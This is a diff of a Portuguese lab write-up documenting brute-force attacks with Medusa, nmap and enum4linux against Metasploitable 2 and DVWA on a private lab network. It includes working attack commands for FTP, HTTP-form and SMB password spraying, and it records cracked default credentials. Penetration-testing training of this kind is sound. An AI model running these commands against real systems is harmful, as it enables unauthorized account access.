@@ -14,7 +14,7 @@ Ambas as VMs foram configuradas para estarem na mesma rede (ex: Rede Interna ou 
 
 2. Descoberta de IP: Após o login nas máquinas, o endereço IP da máquina vulnerável (Metasploitable 2) foi descoberto para direcionar os testes, utilizando o comando:
 
-```bash
+
 ip a
 Exemplo de IP Alvo: 192.168.56.101
 
@@ -24,19 +24,18 @@ O protocolo FTP (File Transfer Protocol) foi o primeiro alvo para um ataque de f
 Passos Executados:
 Descoberta de Portas Abertas (Enumeração de Serviços): O Nmap foi utilizado para verificar o status do serviço FTP e outros serviços comuns:
 
-Bash
+
 nmap -sV -p 21,22,80,445,139 192.168.56.101
 
 Criação de Wordlists: Wordlists simples de usuários e senhas foram criadas para o teste:
 
-Bash
 echo -e "user\nmsfadmin\nroot" > users.txt
 echo -e "123456\npassword\nmsfadmin" > pass.txt
 
 Execução do Medusa: A ferramenta Medusa foi utilizada para realizar o ataque de força bruta contra o serviço FTP, usando a lista de usuários (-U) e a lista de senhas (-P):
 
-Bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
+
 Resultado: Foi obtido sucesso na descoberta de um par de usuário e senha válido (msfadmin:msfadmin) para acesso via FTP.
 
 🌐 ATAQUE DE FORÇA BRUTA VIA WEB (DVWA)
@@ -46,11 +45,11 @@ Passos Executados:
 Acesso ao Alvo: Acessou-se a página de login do DVWA no navegador:
 
 http://192.168.56.101/dvwa/login.php
+
 Análise da Requisição: A ferramenta do programador (Developer Tools) do navegador foi utilizada para inspecionar o formato exato da requisição HTTP POST enviada ao submeter o formulário de login (nomes dos campos username, password e Login).
 
 Execução do Medusa (HTTP Form): O Medusa foi configurado para simular o envio do formulário, especificando a página alvo (-m PAGE), os campos do formulário (-m FORM) e o texto de resposta que indica falha no login (-m 'FAIL='):
 
-Bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
 -m PAGE: '/dvwa/login.php' \
 -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
@@ -64,18 +63,15 @@ O ataque Password Spraying foi testado contra o serviço SMB, visando aplicar um
 Passos Executados:
 Enumeração de Usuários (enum4linux): A ferramenta enum4linux foi utilizada para enumerar usuários válidos no serviço SMB:
 
-Bash
 enum4linux -a 192.168.56.101 | tee enum4_output.txt
 
 Criação de Wordlists: Wordlists específicas para usuários e senhas foram criadas, com foco na técnica de Password Spraying:
 
-Bash
 echo -e "user\nmsfadmin\nservice" > smb_users.txt
 echo -e "password\n123456\nWecome123\nmsfadmin" > senhas_spray.txt
 
 Execução do Medusa (SMB): O Medusa foi utilizado contra o módulo smbnt. O ataque de Password Spraying é simulado ao manter o número de threads (-t 2) baixo para evitar bloqueios de conta (o que é comum em ambientes reais) e usar uma lista de senhas pequena.
 
-Bash
 medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 
 Resultado: Foi obtido sucesso com o usuário e senha msfadmin:msfadmin, validando a eficácia do Password Spraying.
